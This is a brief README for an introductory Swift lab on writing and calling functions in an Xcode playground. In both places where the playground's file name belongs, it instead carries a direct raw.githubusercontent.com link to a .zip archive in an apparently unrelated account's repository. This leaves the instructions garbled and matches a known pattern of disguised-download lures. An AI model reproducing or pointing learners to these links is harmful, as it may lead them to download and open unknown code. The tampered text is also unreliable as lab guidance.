## Overview 

* In this lab, you'll write and call functions. 


## Instructions

* Open up the playground file included with this repo and answer the listed questions (which you will find in the playground file) in order. 
* There are no tests associated with this playground file.
* The following two screenshots are included to assist you in case the file doesn't open right to the https://raw.githubusercontent.com/iamreal2/swift-functionLab-lab-swift-intro-000/master/MyPlayground.playground/lab-function-Lab-swift-intro-v2.0.zip file (which it should by default).
* Make sure you're working in the https://raw.githubusercontent.com/iamreal2/swift-functionLab-lab-swift-intro-000/master/MyPlayground.playground/lab-function-Lab-swift-intro-v2.0.zip file (which you can view by pressing command + 0):
